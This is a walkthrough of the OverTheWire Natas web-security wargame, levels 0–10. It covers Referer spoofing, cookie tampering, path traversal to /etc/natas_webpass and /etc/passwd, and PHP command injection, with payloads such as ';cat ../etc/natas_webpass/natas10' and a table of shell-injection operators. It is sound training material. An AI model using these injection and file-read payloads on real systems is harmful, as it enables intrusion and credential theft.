# Natas

# Level 0

```
Username: natas0
Password: natas0
URL:      http://natas0.natas.labs.overthewire.org
```

# Level 0→1

View the page source to find the password of Natas1

```nix
<!--The password for natas1 is 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq -->
```

# Level 1→2

Right clicking has been blocked. Use the hot keys CTRL+U to view the page source to find the password.

```nix
<!--The password for natas2 is TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI -->
```

# Level 2→3

![image.png](image.png)

View page source for clues. 

```html
<img src="files/pixel.png">
```

The ‘img src’ tag has a link to an image in the /file path. Navigate to the file path to find the users.txt file to find the password. 

![image.png](image%201.png)

`natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH`

# Level 3→4

```
Username: natas3
URL:      http://natas3.natas.labs.overthewire.org
```

[http://natas3.natas.labs.overthewire.org/robots.txt](http://natas3.natas.labs.overthewire.org/robots.txt)

```bash
hint: <!-- No more information leaks!! Not even Google will find it this time... -→
```

## Robot.txt - What is it used for??

A robots.txt file tells search engine crawlers which URLs the crawler can access on your site. This is used mainly to avoid overloading your site with requests; **it is not a mechanism for keeping a web page out of Google**. To keep a web page out of Google, [block indexing with **`noindex`**](https://developers.google.com/search/docs/crawling-indexing/block-indexing) or password-protect the page.

In summary A robots.txt file is used primarily to manage crawler traffic to your site, and *usually* to keep a file off Google, depending on the file type: Web pages, Media Files, Resource file. 

***Shortfalls?***

1. **Not enforced** — crawlers can just ignore it, it's a suggestion not a rule
2. **Public by design** — anyone can read it, attackers included (as above)
3. **Exposes sensitive paths** — disallowing something literally tells everyone where the interesting stuff is
4. **Can't prevent indexing** — if another site links to a blocked page, Google can still index the URL
5. **Syntax inconsistency** — different crawlers interpret the rules differently, so it may not even work as intended
6. **No authentication** — blocking a path in robots.txt doesn't stop direct access, anyone with the URL can just go there

**Bottom line:** It's a courtesy file, not a security control. Treating it as one is a misconfiguration.

[http://natas3.natas.labs.overthewire.org/robots.txt](http://natas3.natas.labs.overthewire.org/robots.txt)

Found a path /s3cr3t/ → this path was disallowed using the robot.txt file

Navigating to this path we find a users.txt file with the flag.
**`natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ`**

# Level 4→5

Access disallowed. You are visiting from "[http://natas4.natas.labs.overthewire.org/index.php](http://natas4.natas.labs.overthewire.org/index.php)" while authorized users should come only from "[http://natas5.natas.labs.overthewire.org/](http://natas5.natas.labs.overthewire.org/)"

## Referer Header - What is it for?

The **Referer header** tells the server where the request came from — i.e. the URL of the previous page that led to the current request.

**Example:**

`Referer: https://google.com/search?q=hackthebox`

GET /index.php HTTP/1.1
Host: [natas4.natas.labs.overthewire.org](http://natas4.natas.labs.overthewire.org/)
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Basic bmF0YXM0OlFyeVpYYzJlMHphaFVMZEhydEh4enlZa2o1OWtVeExR
Connection: keep-alive
Referer: [http://natas4.natas.labs.overthewire.org/index.php](http://natas4.natas.labs.overthewire.org/index.php)
Upgrade-Insecure-Requests: 1
Priority: u=0, i

**Legitimate purposes:**

- Analytics — sites track where traffic comes from
- Access control — some servers only serve resources if the request comes from their own domain
- Logging — helps developers understand navigation flow

How can this be bypassed?

With Referer-based access control, some pages check `if Referer == "admin panel" → grant access`

- You can bypass this control by spoofing the request with web proxies such as Burp Suite, and intercept the request and make changes to the referer header.

The website grants access to traffic coming from natas5.natas.labs.overthewire.org → we need to change the referer header website to this in order to get access.

**Edited version:** 

GET /index.php HTTP/1.1
Host: [natas4.natas.labs.overthewire.org](http://natas4.natas.labs.overthewire.org/)
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Basic bmF0YXM0OlFyeVpYYzJlMHphaFVMZEhydEh4enlZa2o1OWtVeExR
Connection: keep-alive
Referer: http://natas5.natas.labs.overthewire.org/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

Forward the request and then access will be granted.

Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK 

OR

Use the curl tool to set arbitrary headers when burp does not work! 

```bash
curl -u natas4:JDrPnuZAKyl6MkiqQGFIddrqpvgOASth --referer http://natas5.natas.labs.overthewire.org/ http://natas4.natas.labs.overthewire.org
```

This will be the output after running the command:

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas4", "pass": "JDrPnuZAKyl6MkiqQGFIddrqpvgOASth" };</script></head>
<body>
<h1>natas4</h1>
<div id="content">

Access granted. The password for natas5 is e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
</body>
</html>

```

# **Level 4 → Level 5**

 *“Access disallowed. You are not logged in”*

Inspect → Storage → Cookies 

Changed the **“loggedin”** cookie ****value from ‘0’ → ‘1’

Refresh the page and then access will be granted

Access granted. The password for natas6 is 0RoJwHdSKWFTYR5WuiAewauSuNaBXned

# **Level 5 → Level 6**

![image.png](image%202.png)

***Source Code***

```bash
<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>

```

**Breaking it down line by line:**

`include "includes/secret.inc";`

- Pulls in an external file that defines the `$secret` variable
- That file contains the actual secret value

`if(array_key_exists("submit", $_POST))`

- Checks if the form was submitted (i.e. if a `submit` button was clicked)
- Only runs the logic if there's a POST request

`if($secret == $_POST['secret'])`

- Compares the included `$secret` variable against what the user typed into the `secret` input field
- Uses loose comparison `==` (relevant later)

`print "Access granted..."`

- If they match, spits out the natas7 password

Navigate to the /includes/sectret.inc file path and view the file for the secret key.

**Input Secret is:**

`$secret =`*FOEIUWGHFEEUHOFUOIU*

Submit query → Access granted. The password for natas7 is bmg8SvU1LizuWjx3y7xkNERkHxGre0GS 

# **Level 6 → Level 7**

![image.png](image%203.png)

→ View page Source 

```bash
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
```

- Manipulate the ‘?page=’ parameter by including the path to the natas8 password given in the hint. This parameter reads files.

Wordlist to try: 

?page=/etc/natas_webpass/natas8
?file=../../../../etc/natas_webpass/natas8

/etc/passwd
/etc/natas_webpass/natas8
../../../../etc/natas_webpass/natas8
....//....//etc/natas_webpass/natas8  (filter bypass)

natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8 ✔️

Password: xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q 

# **Level 8 → Level 9**

![image.png](image%204.png)

```bash
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```

Secret key can be found in the source code, however it is encoded

In order to decode it we need to find what kind of encoding it is. With the use of the Magic operator, this in put was given: **==QcCtmMml1ViV3b**

The equal signs hint that this string is encoded in Base64, but this kind of encoding ends with == → it doesn’t start with them. The string is flipped, so if we flip it → **b3ViV1lmMmtCcQ==** we can decode it that way. 

The output of the decoding is oubWYf2kBq → this is the secret key!

Access granted. The password for natas9 is ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t 

# **Level 9 → Level 10**

![image.png](image%205.png)

***Source Code***

```bash
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

**Breaking down the logic: What the code is doing**

`$key = $_REQUEST["needle"];`

- Takes user input directly from the URL parameter `needle`
- Zero sanitisation, zero filtering

`passthru("grep -i $key dictionary.txt");`

- Passes the input **directly** into a shell command
- `passthru()` executes it and prints the raw output
- User input lands inside a shell command = **command injection**

*grep -i [YOUR INPUT] dictionary.txt*

## ‘passthru()’ Function in PHP

passthru — Execute an external program and display raw output

The **passthru()** function is similar to the [exec()](https://www.php.net/manual/en/function.exec.php) function in that it executes a **`command`.** This function should be used in place of [exec()](https://www.php.net/manual/en/function.exec.php) or [system()](https://www.php.net/manual/en/function.system.php) when the output from the Unix command is binary data which needs to be passed directly back to the browser.

How to exploit this function: Shell injection/Command Injection

The `passthru` function in the above program composes a shell command that is then executed by the web server. Since part of the command it composes is taken from the user input provided by the web browser, this allows the user to inject malicious shell commands. One can inject code into this program in several ways by exploiting the syntax of various shell features.

| Shell feature | `USER_INPUT` value | Resulting shell command | Explanation |
| --- | --- | --- | --- |
| Sequential execution | `; malicious_command` | `/bin/funnytext ; malicious_command` | Executes `funnytext`, then executes `malicious_command`. |
| [Pipelines](https://en.wikipedia.org/wiki/Pipeline_(Unix)) | `| malicious_command` | `/bin/funnytext | malicious_command` | Sends the output of `funnytext` as input to `malicious_command`. |
| Command substitution | ``malicious_command`` | `/bin/funnytext `malicious_command`` | Sends the output of `malicious_command` as arguments to `funnytext`. |
| Command substitution | `$(malicious_command)` | `/bin/funnytext $(malicious_command)` | Sends the output of `malicious_command` as arguments to `funnytext`. |
| AND list | `&& malicious_command` | `/bin/funnytext && malicious_command` | Executes `malicious_command` [iff](https://en.wikipedia.org/wiki/Iff) `funnytext` returns an exit status of 0 (success). |
| OR list | `|| malicious_command` | `/bin/funnytext || malicious_command` | Executes `malicious_command` [iff](https://en.wikipedia.org/wiki/Iff) `funnytext` returns a nonzero exit status (error). |
|  |  |  |  |
| Output redirection | `> ~/.bashrc` | `/bin/funnytext > ~/.bashrc` | Overwrites the contents the `.bashrc` file with the output of `funnytext`. |
| Input redirection | `< ~/.bashrc` | `/bin/funnytext < ~/.bashrc` | Sends the contents of the `.bashrc` file as input to `funnytext`. |

We can break out of the original command using ; or | — in order to execute our own commands.

Inject the following payload into the search bar →;ls ../../../../../../

This tells the server to go back by a few directories and list them

***Output:***

```nix
dictionary.txt

../../../../../../:
bin
bin.usr-is-merged
boot
dev
etc
home
lib
lib.usr-is-merged
lib64
lost+found
media
mnt
natas33
opt
proc
root
run
sbin
sbin.usr-is-merged
snap
srv
sys
tmp
usr
var
```

Using the following payload: ;ls ../../../../../../etc/natas_webpass

 Navigate to the /etc/ directory → /natas_webpass directory

Use the cat command ;cat ../../../../../../etc/natas_webpass/natas10 to view the contents of the natas10 file to view the password. 

Password: `t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu`

`t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu`